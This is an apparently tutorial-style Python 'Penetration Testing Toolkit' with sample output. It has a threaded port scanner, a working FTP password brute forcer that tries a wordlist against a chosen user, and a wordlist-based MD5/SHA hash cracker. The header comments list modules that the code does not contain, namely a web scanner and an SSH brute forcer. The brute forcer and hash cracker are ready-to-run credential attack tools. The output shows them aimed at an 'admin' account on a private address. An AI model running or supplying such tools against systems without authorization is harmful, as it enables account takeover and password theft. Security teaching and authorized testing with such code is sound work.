# Penetration Testing Toolkit
# Module 1: Web Vulnerability Scanner
# Module 2: Port Scanner
# Module 3: SSH Brute Forcer (Dummy Logic)
import socket
import threading
import sys
import time
import hashlib
import itertools
from queue import Queue
import ftplib # Explicitly import ftplib

class PortScanner:
    def __init__(self, target, ports=None, timeout=1):
        self.target = target
        self.timeout = timeout
        if ports is None:
            self.ports = range(1, 1025)  # default ports 1-1024
        else:
            self.ports = ports
        self.open_ports = []

    def scan_port(self, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    self.open_ports.append(port)
        except:
            pass

    def run(self, thread_count=100):
        threads = []
        for port in self.ports:
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
            if len(threads) >= thread_count:
                for thread in threads:
                    thread.join()
                threads = []
        for thread in threads:
            thread.join()
        self.open_ports.sort()
        return self.open_ports

class BruteForcer:
    def __init__(self, target_host, target_port, username, password_list_file, protocol="ftp"):
        self.target_host = target_host
        self.target_port = target_port
        self.username = username
        self.password_list_file = password_list_file
        self.protocol = protocol.lower()
        self.found_password = None

    def ftp_brute_force(self):
        import ftplib
        print(f"Starting FTP brute force on {self.target_host}:{self.target_port} as user '{self.username}'")
        try:
            with open(self.password_list_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(self.target_host, self.target_port, timeout=5)
                        ftp.login(user=self.username, passwd=pwd)
                        print(f"[+] Password found: {pwd}")
                        self.found_password = pwd
                        ftp.quit()
                        return pwd
                    except ftplib.error_perm:
                        pass
                    except Exception as e:
                        # print(f"Error trying password {pwd}: {e}")
                        pass
            print("[!] Password not found in the wordlist.")
        except Exception as e:
            print(f"[!] Could not open password list file: {e}")

    def run(self):
        if self.protocol == "ftp":
            return self.ftp_brute_force()
        else:
            print("[!] Protocol not supported for brute forcing!")
            return None

class HashCracker:
    def __init__(self, hash_value, algorithm='md5', wordlist=None):
        self.hash_value = hash_value.lower()
        self.algorithm = algorithm.lower()
        self.wordlist = wordlist

    def crack_hash(self):
        if not self.wordlist:
            print("[!] Wordlist file required to crack hashes.")
            return None
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as file:
                for word in file:
                    word = word.strip()
                    if not word:
                        continue
                    hash_obj = hashlib.new(self.algorithm)
                    hash_obj.update(word.encode('utf-8'))
                    if hash_obj.hexdigest() == self.hash_value:
                        print(f"[+] Hash cracked! Password: {word}")
                        return word
            print("[!] Password not found in wordlist.")
            return None
        except Exception as e:
            print(f"[!] Error reading wordlist file: {e}")
            return None

def print_banner():
    banner = """
    ==============================
    Penetration Testing Toolkit
    Modules:
    1. Port Scanner
    2. FTP Brute Forcer
    3. Hash Cracker (MD5 and others)
    ==============================
    """
    print(banner)

def main():
    print_banner()

    while True:
        print("\nSelect module:")
        print("1 - Port Scanner")
        print("2 - FTP Brute Forcer")
        print("3 - Hash Cracker")
        print("0 - Exit")

        choice = input("Enter choice: ").strip()

        if choice == '1':
            target = input("Enter target IP/hostname: ").strip()
            ports_input = input("Enter ports separated by comma or range (e.g. 21,22,80 or 1-100): ").strip()
            ports = parse_ports(ports_input)
            thread_count_input = input("Enter number of threads (default 100): ").strip()
            threads = int(thread_count_input) if thread_count_input.isdigit() else 100

            scanner = PortScanner(target, ports)
            open_ports = scanner.run(thread_count=threads)
            if open_ports:
                print(f"Open ports for {target}: {open_ports}")
            else:
                print(f"No open ports found on {target}")

        elif choice == '2':
            host = input("FTP server IP/host: ").strip()
            port_input = input("FTP port (default 21): ").strip()
            port = int(port_input) if port_input.isdigit() else 21
            username = input("Username to brute force: ").strip()
            wordlist = input("Password wordlist path: ").strip()
            brute_forcer = BruteForcer(host, port, username, wordlist)
            result = brute_forcer.run()
            if not result:
                print("Brute force failed or password not found.")

        elif choice == '3':
            hash_val = input("Enter hash to crack: ").strip()
            algo = input("Enter hash algorithm (md5, sha1, sha256) default md5: ").strip().lower() or 'md5'
            wordlist = input("Enter wordlist path: ").strip()
            cracker = HashCracker(hash_val, algo, wordlist)
            cracked = cracker.crack_hash()
            if not cracked:
                print("Failed to crack hash.")

        elif choice == '0':
            print("Exiting toolkit.")
            # Replace sys.exit(0) with break to exit the loop gracefully in Jupyter
            break

        else:
            print("Invalid choice, try again.")

def parse_ports(ports_input):
    ports_input = ports_input.replace(' ', '')
    ports = set()
    parts = ports_input.split(',')

    for part in parts:
        if '-' in part:
            start, end = part.split('-')
            if start.isdigit() and end.isdigit():
                ports.update(range(int(start), int(end)+1))
        elif part.isdigit():
            ports.add(int(part))
    if not ports:
        return range(1, 1025)
    return sorted(ports)

if __name__ == "__main__":
    main()

**OUTPUT**
Enter choice: 1
Enter target IP/hostname: scanme.nmap.org
Enter ports separated by comma or range (e.g. 21,22,80 or 1-100): 21,22,80,443
Enter number of threads (default 100):100
Open ports for scanme.nmap.org: [22, 80]
------------------------------------------------------------------------------------------
Enter choice: 2
FTP server IP/host: 192.168.1.100
FTP port (default 21):21
Username to brute force: admin
Password wordlist path: passwords.txt

123456
password
admin
ftpadmin
------------------------------------------------------------------------------------------
Enter choice: 3
Enter hash to crack: 5f4dcc3b5aa765d61d8327deb882cf99
Enter hash algorithm (md5, sha1, sha256) default md5:
Enter wordlist path: passwords.txt
[+] Hash cracked! Password: password
--------------------------------------------------------------------------------------------
Enter choice: 0
Exiting toolkit.

